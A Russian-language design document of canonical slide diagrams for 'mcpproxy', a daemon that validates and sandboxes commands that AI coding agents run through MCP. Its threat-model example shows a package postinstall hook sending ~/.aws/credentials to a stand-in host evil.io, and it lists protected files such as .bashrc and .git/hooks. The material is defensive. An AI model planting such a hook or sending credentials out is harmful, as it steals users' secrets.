# Канонические диаграммы

Топология и путь вызова должны выглядеть одинаково во всех деках. Копируй отсюда,
не перерисовывай.

## Топология

```mermaid
flowchart TD
    C["MCP-клиент<br/>Claude Code, Cursor, …"]
    S["mcpproxy-shim<br/>тонкий stdio-мост"]
    D["mcpproxyd<br/>ЯДРО"]
    E["Electron UI"]
    P["Дочерний процесс<br/>в песочнице"]

    C -->|"stdio / JSON-RPC"| S
    S -->|"unix socket 0600<br/>+ peer-cred"| D
    D -->|"поток событий"| E
    E -->|"вердикт по апруву"| D
    D -->|"spawn(argv[]) без shell"| P
    P -->|"stdout/stderr<br/>+ sandbox violations"| D
```

## Две линии обороны — центральный слайд

```mermaid
flowchart LR
    subgraph L1["Линия 1 — валидатор"]
        direction TB
        A1["контролирует МОДЕЛЬ"]
        A2["что именно запускается"]
        A3["argv · схемы · пути"]
    end
    subgraph L2["Линия 2 — песочница"]
        direction TB
        B1["контролирует КОД"]
        B2["что запущенное может сделать"]
        B3["ФС · сеть · лимиты"]
    end
    L1 -->|"argv собран"| L2
```

Сопроводительный текст к этому слайду — цепочка, которую валидатор не видит:

```
pnpm test
 └─ package.json из репо (изменяем кем угодно)
     └─ vitest
         └─ ~1200 пакетов из node_modules
             └─ postinstall → fetch('https://evil.io', body: ~/.aws/credentials)
```

Параметры валидны · бинарь в allowlist · директория правильная · ключи утекли.

## Путь вызова

```mermaid
sequenceDiagram
    participant M as Модель
    participant S as shim
    participant D as mcpproxyd
    participant U as Electron
    participant P as Процесс

    M->>S: tools/call run_tests {pattern:"auth"}
    S->>D: {recipe, params}
    D->>D: lock_check · validate · resolve_paths
    D->>D: build_argv · classify_risk
    alt риск high
        D->>U: апрув (argv, cwd, профиль)
        U->>D: разрешено / запрещено / TTL
    end
    D->>D: build_env · build_profile
    D->>P: spawn(argv) под sandbox-exec
    P-->>D: stdout / stderr / violations
    D->>D: redact · hash-chain
    D-->>U: события в таймлайн
    D-->>S: результат
    S-->>M: tool result (untrusted)
```

## Модель прав песочницы

| Операция | По умолчанию | Приоритет правил |
|---|---|---|
| Чтение | разрешено | `allowRead` бьёт `denyRead` |
| Запись | запрещено | `denyWrite` бьёт `allowWrite` |
| Сеть | запрещена | доменный allowlist через прокси |

**Mandatory deny** (не снимается даже явным allow):
`.bashrc` · `.zshrc` · `.profile` · `.gitconfig` · `.git/hooks/` · `.vscode/` · `.idea/` · `.claude/commands/`

## Волны разработки

```mermaid
gantt
    dateFormat X
    axisFormat %s
    section Шов
    E0 контракты          :e0, 0, 1
    section Волна 1
    E1 policy             :e1, 1, 3
    E2 валидатор          :e2, 1, 3
    E3 песочница          :e3, 1, 3
    E6 секреты и аудит    :e6, 1, 3
    E7 UI на моках        :e7, 1, 4
    section Волна 2
    E4 MCP + IPC          :e4, 3, 5
    section Волна 3
    E5 апрувы             :e5, 5, 6
    E8 red-team           :e8, 5, 7
    section Финал
    E9 хардненинг и демо  :e9, 7, 8
```

## Кульминация S5 — таблица переключателя

| Режим | Тесты | Сеть | ФС |
|---|---|---|---|
| `sandbox: none` | ✅ прошли | 🔴 `evil.io:443` — 1.2 KB отправлено | 🔴 `~/.aws/credentials` прочитан |
| `sandbox: seatbelt` | ✅ прошли | 🟢 `evil.io:443` — **denied**, 0 байт | 🟢 `~/.aws/credentials` — **denied** |

Один и тот же валидный вызов. Два клика. Разный исход.
